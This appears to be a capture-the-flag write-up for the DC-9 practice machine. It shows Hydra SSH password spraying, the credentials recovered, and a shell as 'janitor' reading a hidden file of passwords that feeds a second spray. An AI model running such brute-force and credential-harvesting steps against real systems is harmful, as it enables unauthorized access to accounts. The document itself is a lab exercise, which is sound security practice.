# hydra ssh spray

```bash
┌──(kalium㉿kali)-[~/dc9]
└─$ hydra -P pass.txt -L user.txt -s 22 192.168.178.72 ssh
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-05 19:42:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 289 login tries (l:17/p:17), ~19 tries per task
[DATA] attacking ssh://192.168.178.72:22/
[22][ssh] host: 192.168.178.72   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.178.72   login: joeyt   password: Passw0rd
[22][ssh] host: 192.168.178.72   login: janitor   password: Ilovepeepee
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-05 19:42:55
```

# Login to SSH as janitor

new password found
```
janitor@dc-9:~/.secrets-for-putin$ cat passwords-found-on-post-it-notes.txt
BamBam01
Passw0rd
smellycats
P0Lic#10-4
B4-Tru3-001
4uGU5T-NiGHts
```

## Hydra Spray with new password

``` bash
──(kalium㉿kali)-[~/dc9]
└─$ hydra -P pass_new.txt -L users_new.txt -s 22 192.168.178.72 ssh                                                                                                                                           1 ⚙
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-05 20:01:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 360 login tries (l:18/p:20), ~23 tries per task
[DATA] attacking ssh://192.168.178.72:22/
[22][ssh] host: 192.168.178.72   login: chandlerb   password: UrAG0D!
[22][ssh] host: 192.168.178.72   login: fredf   password: B4-Tru3-001
[22][ssh] host: 192.168.178.72   login: janitor   password: Ilovepeepee
[22][ssh] host: 192.168.178.72   login: joeyt   password: Passw0rd
[STATUS] 339.00 tries/min, 339 tries in 00:01h, 24 to do in 00:01h, 16 active
1 of 1 target successfully completed, 4 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-05-05 20:02:18

```
